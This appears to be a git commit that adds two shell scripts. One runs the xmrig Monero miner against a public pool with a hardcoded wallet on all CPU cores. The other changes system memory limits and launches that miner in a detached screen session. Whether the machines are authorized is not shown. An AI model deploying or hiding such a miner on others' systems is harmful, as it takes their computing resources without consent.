063f2e809fbb0561f8a12f033ff52d4f67e39006
pawel.fajkowski@hpe.com <pawel.fajkowski@hpe.com>
2017-12-08 22:31:43 +0100

    testsing

---
+++ ml.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+WALLET="45unwokYSf48piDg96ZBdBRqNXARySZoSZ92ddSQH7hYYpKbWgH37NzBtnioMVofXcNU4Ff5rxhJGMsjAbz9XtbPNrkdUGV"
+
+CPUS=$(cat /proc/cpuinfo | grep processor | wc -l)
+/root/xmrig -o pool.supportxmr.com:7777 -u $WALLET -p ${1}${2}${HOSTNAME:0:6}${IP} -t $CPUS --av=2 -r 3 --retry-pause=10 --donate-level=1 --print-time=60
---
+++ setup_f2.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+apt-get -y update
+apt-get -y install libmicrohttpd10
+
+sysctl -w vm.nr_hugepages=128
+
+echo '* soft memlock 262144' >> /etc/security/limits.conf
+echo '* hard memlock 262144' >> /etc/security/limits.conf
+
+screen -dmS xmrig /root/ml.sh $1 $2
